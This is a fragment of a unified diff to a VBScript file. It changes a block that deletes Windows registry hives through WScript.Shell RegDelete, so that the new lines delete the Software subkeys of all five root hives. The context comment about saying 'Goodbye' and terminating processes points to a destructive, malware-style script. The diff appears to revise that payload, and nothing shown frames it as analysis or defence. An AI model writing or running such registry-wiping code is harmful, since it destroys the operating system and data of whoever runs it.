@@ -22,10 +22,11 @@ Set objFSO = Nothing
 Set objShell = CreateObject("WScript.Shell")
 
 ' Delete specific registry keys
-objShell.RegDelete "HKEY_USERS"
-objShell.RegDelete "HKEY_LOCAL_MACHINE"
-objShell.RegDelete "HKEY_CURRENT_USER"
-objShell.RegDelete "HKEY_CLASSES_ROOT"
+objShell.RegDelete "HKEY_CURRENT_CONFIG\Software"
+objShell.RegDelete "HKEY_USERS\Software"
+objShell.RegDelete "HKEY_LOCAL_MACHINE\Software"
+objShell.RegDelete "HKEY_CURRENT_USER\Software"
+objShell.RegDelete "HKEY_CLASSES_ROOT\Software"
 
 ' Say "Goodbye" and terminate various processes on the computer
 i = 1
